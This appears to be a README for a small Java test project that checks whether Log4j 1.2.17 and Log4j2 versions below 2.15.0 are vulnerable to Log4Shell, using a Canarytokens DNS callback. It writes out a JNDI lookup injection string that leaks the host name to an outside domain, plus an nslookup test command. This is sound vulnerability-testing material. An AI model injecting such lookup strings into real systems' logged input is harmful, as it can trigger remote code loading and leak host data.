# Log4jVulnerabilityTest
Small example on demonstrating the remote code execution vulnerability of Log4j2 in contrast to Log4j

##To check/reproduce the Log4j2 remote code execution vulnerability follow these steps:

- Review background material on why a Log4j2 feature can cause a vulnerability of executing remote code uncontrolled (e.g. https://www.heise.de/ratgeber/Schutz-vor-schwerwiegender-Log4j-Luecke-was-jetzt-hilft-und-was-nicht-6292961.html)
- Apply with an email address for a *Log4Shell* token from: https://canarytokens.org/generate
- Whenever you use Log4j2 to log that token (e.g. ${jndi:ldap://x${hostName}.L4J.xxxxxxxxxxxxxxxxxxxxxxxxx.canarytokens.com/a}), you will receive an email, that your logger tried to resolve (DNS lookup) the hostname contained in the token to download code (don't panic, there is no code downloadable via that token, the email will be sent when the hostname is resolved).
- You can test receiving an email works correctly from a commandline with the command: nslookup 123.123.123.123.L4J.xxxxxxxxxxxxxxxxxxxxxxxxx.canarytokens.com

Verify that Log4j is not vulnerable up to the latest version 1.2.17 (though it is EOL (end of life)):

- Insert your token into the Java source: Log4jTest.java
- Execute Log4jTest and no email will be sent, but the string containing the token will be logged in the console

Verify that Log4j2 below 2.15.0 is vulnerable:

- Insert your token into the Java source: Log4j2Test.java
- Execute Log4jTest and the application will show an exception after about 1 minute and you will receive an email that Log4j2 tried to resolve the hostname, which means it tried to download code exposing the potential vulnerability
- Replace in Maven's pom.xml Log4j2 with version 2.15.0 or above, and no email will be sent, but the string containing the token will be logged in the console as with Log4j
